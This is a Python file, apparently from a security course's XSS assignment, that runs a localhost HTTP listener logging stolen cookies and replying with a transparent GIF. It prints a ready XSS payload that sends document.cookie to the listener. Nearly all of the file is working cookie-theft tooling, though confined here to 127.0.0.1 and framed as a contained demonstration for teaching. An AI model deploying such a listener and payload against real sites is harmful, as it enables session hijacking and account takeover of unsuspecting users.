#!/usr/bin/env python3
"""
cookie-stealer-demo/server.py — Local Contained Cookie Stealer Listener
Assignment 05 — Cross-Site Scripting (XSS)

Demonstrates how an unmitigated XSS vulnerability (lacking HttpOnly cookies)
allows session theft by capturing document.cookie payloads.

STRICT ALLOWLIST ENFORCEMENT:
Listens strictly on 127.0.0.1:8001. Enforces localhost-only access.
All captured cookies are recorded in local log file: captured_cookies.log
"""

import sys
import os
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

BIND_HOST = "127.0.0.1"
BIND_PORT = 8001
LOG_FILE = os.path.join(os.path.dirname(__file__), "captured_cookies.log")

class CookieStealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        if client_ip not in ("127.0.0.1", "::1"):
            self.send_error(403, "Access restricted to localhost only.")
            return

        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        stolen_cookie = params.get('c', [''])[0]
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_entry = f"[{timestamp}] IP: {client_ip} | Stolen Cookie: {stolen_cookie}\n"
        print(f"[!] {log_entry.strip()}")

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
            print(f"[-] Error writing to log: {e}")

        # Return a 1x1 transparent GIF so client-side image tags complete silently
        transparent_gif = (
            b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00'
            b'\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        )
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Content-Length", str(len(transparent_gif)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(transparent_gif)

    def log_message(self, format, *args):
        pass

def main():
    print(f"[*] [CONTAINED DEMO] Cookie Stealer server running on http://{BIND_HOST}:{BIND_PORT}")
    print(f"[*] Logging captured tokens to: {LOG_FILE}")
    print("[*] Target payload example: <script>new Image().src='http://127.0.0.1:8001/?c='+encodeURIComponent(document.cookie);</script>")
    server = HTTPServer((BIND_HOST, BIND_PORT), CookieStealerHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Cookie stealer listener terminated.")
        server.server_close()

if __name__ == '__main__':
    main()

